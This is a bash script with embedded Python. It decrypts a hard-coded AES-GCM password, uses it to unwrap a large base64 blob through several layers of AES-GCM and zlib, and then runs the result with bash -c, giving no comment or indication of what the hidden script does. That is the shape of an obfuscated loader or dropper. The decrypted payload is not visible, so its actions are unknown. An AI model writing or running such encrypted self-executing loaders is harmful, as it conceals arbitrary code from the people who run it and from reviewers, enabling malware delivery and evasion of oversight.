#!/bin/bash

decrypted=$(python3 - << 'EOF'
import base64, sys, zlib, os
from Crypto.Protocol.KDF import scrypt
from Crypto.Cipher import AES

def get_decryption_password():
    enc_pwd_blob = "M73yaf+NcrUYPs+ZjjxvpysEcQAUFh0lURembS3lQOFQ1MXIoTtpBjggD+gnvr6sKX4/0SWgMI1z46X9PXA5G6T2/DQ3sqaOKtY9tZJS1KZ7Fjwa3UOcOkgmMXJWp0CJUw=="
    magic_key = b"gen_z_magic_key_for_decrypt_32b!"
    raw = base64.b64decode(enc_pwd_blob)
    salt = raw[:16]
    nonce = raw[16:28]
    tag = raw[28:44]
    ct = raw[44:]
    return AES.new(scrypt(magic_key, salt, key_len=32, N=131072, r=8, p=2),
                   AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag).decode()

def decrypt_script_with_layers(enc_script, password):
    raw = base64.b64decode(enc_script)
    layers = raw[0]
    data = raw[1:]
    for _ in range(layers):
        salt = data[:32]
        nonce = data[32:44]
        tag = data[44:60]
        ct = data[60:]
        key = scrypt(password, salt, key_len=32, N=131072, r=8, p=2)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        data = cipher.decrypt_and_verify(ct, tag)
    return zlib.decompress(data).decode()

password = get_decryption_password()
print(decrypt_script_with_layers("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", password))
EOF
)
if [ $? -ne 0 ]; then
    echo " "
    exit 1
fi
bash -c "$decrypted"
